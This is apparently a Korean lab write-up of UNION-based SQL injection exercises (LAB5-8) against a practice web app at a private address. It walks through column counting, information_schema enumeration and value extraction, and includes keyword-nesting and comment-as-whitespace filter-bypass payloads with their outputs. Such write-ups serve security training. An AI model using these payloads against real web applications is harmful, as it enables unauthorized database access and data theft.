---
title: "웹보안 및 모의해킹 Lab - SQLi Labs (2) UNION-Based"
date: 2026-03-20T19:10:00+09:00
categories:
  - Web Hacking
tags:
  - Web Security Lab
  - SQL Injection
  - Union-Based SQL Injection
  - Filter Bypass
last_modified_at: 2026-03-26T19:10:00+09:00
published: true
---
## 문제

대상: `http://192.168.0.21:8080/vuln/sqli/`

범위: `LAB5 ~ LAB8`

## 개요

핵심: `UNION SELECT`로 원래 조회 결과에 다른 테이블 값 삽입
결과만 적기보다 데이터베이스 이름과 테이블 이름을 모른다고 가정하고 단계별 정찰 기준으로 접근

UNION 기반에서 일반적으로 확인한 순서는 다음과 같음

1. 문자열 탈출 가능 여부 확인
2. 컬럼 수 확인
3. 어떤 컬럼이 화면에 출력되는지 확인
4. 현재 DB 이름 확인
5. `information_schema.tables`로 테이블 확인
6. `information_schema.columns`로 컬럼 확인
7. 실제 데이터 추출

## 먼저 알아두면 좋은 SQL 함수와 구문

- `UNION SELECT`: 두 개 이상의 SELECT 결과를 하나로 합침
- `database()`: 현재 연결된 데이터베이스 이름 반환
- `user()`: 현재 DB 접속 계정 정보 반환
- `version()`: DBMS 버전 반환
- `group_concat(column)`: 여러 행의 값을 하나의 문자열로 이어 붙임
- `information_schema.tables`: 현재 DB 서버의 테이블 메타데이터가 있는 시스템 테이블
- `information_schema.columns`: 컬럼 메타데이터가 있는 시스템 테이블
- `table_schema=database()`: 현재 사용 중인 DB에 속한 테이블만 보겠다는 뜻

예를 들어

```sql
SELECT group_concat(table_name)
FROM information_schema.tables
WHERE table_schema=database()
```

는 “현재 DB에 있는 모든 테이블 이름을 쉼표로 이어 붙여 보여달라”는 의미다

## 공통 정찰 흐름

### 1. 컬럼 수 확인

보통 `ORDER BY n` 또는 `UNION SELECT 1,2,3...` 방식으로 확인함

예시:

```sql
' UNION SELECT 1,2,3 -- 1
```

이 값이 정상적으로 렌더링되면 컬럼 수는 3개이고, 최소한의 타입 정합성도 맞는다고 판단 가능

### 2. 출력 위치 확인

`1,2,3` 중 어느 값이 화면에 실제로 보이는지 확인하면, 나중에 토큰이나 코드 값을 어느 칸에 넣어야 할지 결정할 수 있음

### 3. DB 이름 확인

다음과 같이 현재 DB 이름 확인 가능

```sql
' UNION SELECT database(),2,3 -- 1
```

### 4. 테이블 이름 확인

현재 DB에서 테이블을 확인하는 예시:

```sql
' UNION SELECT group_concat(table_name),2,3
FROM information_schema.tables
WHERE table_schema=database() -- 1
```

### 5. 컬럼 이름 확인

특정 테이블 컬럼 확인:

```sql
' UNION SELECT group_concat(column_name),2,3
FROM information_schema.columns
WHERE table_name='sqli_lab5_internal_assets' -- 1
```

### 6. 실제 값 추출

출력 컬럼 위치를 맞춘 뒤 민감 값을 넣음

## LAB5. UNION SELECT - 기본형

### 개요

가장 기본적인 UNION 기반 랩이었음. 필터가 약하고 출력 위치가 명확해 정찰 순서를 그대로 따라가면 되었음

### 사용한 페이로드

컬럼 수 확인:

```sql
' UNION SELECT 1,2,3 -- 1
```

확인한 출력:

```text
1 | 2 | 3
```

민감 값 추출:

```sql
' UNION SELECT asset_code,2,3 FROM sqli_lab5_internal_assets -- 1
```

확인한 출력:

```text
SEC-SQLI-LAB5-K7mNp2Qx | 2 | 3
```

### 대표 대체 페이로드

DB 이름 확인:

```sql
' UNION SELECT database(),2,3 -- 1
```

테이블 확인:

```sql
' UNION SELECT group_concat(table_name),2,3
FROM information_schema.tables
WHERE table_schema=database() -- 1
```

컬럼 확인:

```sql
' UNION SELECT group_concat(column_name),2,3
FROM information_schema.columns
WHERE table_name='sqli_lab5_internal_assets' -- 1
```

### 결과

```text
SEC-SQLI-LAB5-K7mNp2Qx
```

## LAB6. UNION SELECT - 동일 구조 반복

### 개요

Lab 5와 거의 같은 구조였고, 목표 테이블만 달라짐. 따라서 정찰 순서도 동일하게 적용 가능했음

### 사용한 페이로드

컬럼 수 확인:

```sql
' UNION SELECT 1,2,3 -- 1
```

확인한 출력:

```text
1 | 2 | 3
```

민감 값 추출:

```sql
' UNION SELECT asset_code,2,3 FROM sqli_lab6_internal_assets -- 1
```

확인한 출력:

```text
SEC-SQLI-LAB6-W4vRt9Yz | 2 | 3
```

### 대표 대체 페이로드

```sql
' UNION SELECT database(),2,3 -- 1
' UNION SELECT group_concat(table_name),2,3 FROM information_schema.tables WHERE table_schema=database() -- 1
' UNION SELECT group_concat(column_name),2,3 FROM information_schema.columns WHERE table_name='sqli_lab6_internal_assets' -- 1
```

### 결과

```text
SEC-SQLI-LAB6-W4vRt9Yz
```

## LAB7. UNION SELECT - 키워드 중첩 우회

### 개요

`UNION`, `SELECT` 직접 입력 시 제거되는 구조
필터 이후에도 유효한 키워드가 남도록 중첩 형태 입력 필요

### 사용한 페이로드

컬럼 수 확인:

```sql
' unionUNION selectSELECT 1,2,3 -- 1
```

확인한 출력:

```text
1 | 2 | 3
```

민감 값 추출:

```sql
' UNIONunion selectSELECT asset_code,2,3 FROM sqli_lab7_internal_assets -- 1
```

확인한 출력:

```text
SEC-SQLI-LAB7-B2cHf8Jk | 2 | 3
```

### 분석

- 단순 치환 필터는 `UNION`을 지워도 앞뒤 문자열 조합으로 다시 `UNION`이 남을 수 있음
- `SELECT`도 같은 방식으로 우회 가능함
- 즉 필터 우회가 먼저이고, 그 다음 단계는 일반 UNION 흐름과 동일함

### 대표 대체 페이로드

```sql
' uniunionon selselectect 1,2,3 -- 1
' UNIunionON SELselectECT database(),2,3 -- 1
```

### 결과

```text
SEC-SQLI-LAB7-B2cHf8Jk
```

## LAB8. UNION SELECT - 주석 기반 공백 우회

### 개요

공백과 일부 키워드에 제한이 있는 상황을 가정한 랩이었음. 이 경우에는 주석을 공백처럼 사용해 쿼리 토큰을 이어 붙이는 방식이 유효했음

### 사용한 페이로드

컬럼 수 확인:

```sql
'/**/UNION/**/SELECT/**/1,2,3#
```

확인한 출력:

```text
1 | 2 | 3
```

민감 값 추출:

```sql
'/**/UNION/**/SELECT/**/asset_code,2,3/**/FROM/**/sqli_lab8_internal_assets#
```

확인한 출력:

```text
SEC-SQLI-LAB8-L9nQr5Vx | 2 | 3
```

### 대표 대체 페이로드

```sql
'/**/UNION/**/SELECT/**/database(),2,3#
'/**/UNION/**/SELECT/**/group_concat(table_name),2,3/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema=database()#
'/**/UNION/**/SELECT/**/group_concat(column_name),2,3/**/FROM/**/information_schema.columns/**/WHERE/**/table_name='sqli_lab8_internal_assets'#
```

### 결과

```text
SEC-SQLI-LAB8-L9nQr5Vx
```

## 정리

UNION 기반 SQLi에서 가장 중요한 건 정답 테이블 이름을 처음부터 아는 것이 아니라, 다음 순서를 안정적으로 밟는 것이었음

1. 컬럼 수 확인
2. 출력 위치 확인
3. `database()` 확인
4. `information_schema.tables`로 테이블 찾기
5. `information_schema.columns`로 컬럼 찾기
6. 실제 값 추출

필터가 추가되더라도 결국 본질은 같고, 달라지는 것은 키워드와 공백을 어떻게 우회하느냐다

